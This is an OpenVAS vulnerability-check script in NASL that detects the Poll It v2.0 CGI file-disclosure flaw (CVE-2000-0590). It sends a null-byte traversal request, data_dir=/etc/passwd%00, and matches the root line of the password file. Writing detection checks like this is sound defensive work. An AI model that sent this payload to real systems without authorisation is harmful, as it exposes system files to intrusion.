###############################################################################
# OpenVAS Vulnerability Test
# $Id: pollit.nasl 6046 2017-04-28 09:02:54Z teissa $
#
# Poll It v2.0 cgi
#
# Authors:
# Thomas Reinke <reinke@securityspace.com>
# Changes by rd :
#    - attempt to read /etc/passwd
#    - script_id
#    - script_bugtraq_id(1431);
#
# Copyright:
# Copyright (C) 2000 Thomas Reinke
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10459");
  script_version("$Revision: 6046 $");
  script_tag(name:"last_modification", value:"$Date: 2017-04-28 11:02:54 +0200 (Fri, 28 Apr 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(1431);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2000-0590");
  script_name("Poll It v2.0 cgi");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2000 Thomas Reinke");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  tag_summary = "'Poll_It_SSI_v2.0.cgi' is installed. This CGI has
  a well known security flaw that lets an attacker retrieve any file from
  the remote system, e.g. /etc/passwd.";

  tag_solution = "remove 'Poll_It_SSI_v2.0.cgi' from /cgi-bin.";

  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

foreach dir( make_list_unique( "/", "/pollit", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = string( dir, "/Poll_It_SSI_v2.0.cgi?data_dir=/etc/passwd%00" );

  if( http_vuln_check( port:port, url:url, pattern:".*root:.*:0:[01]:.*" ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
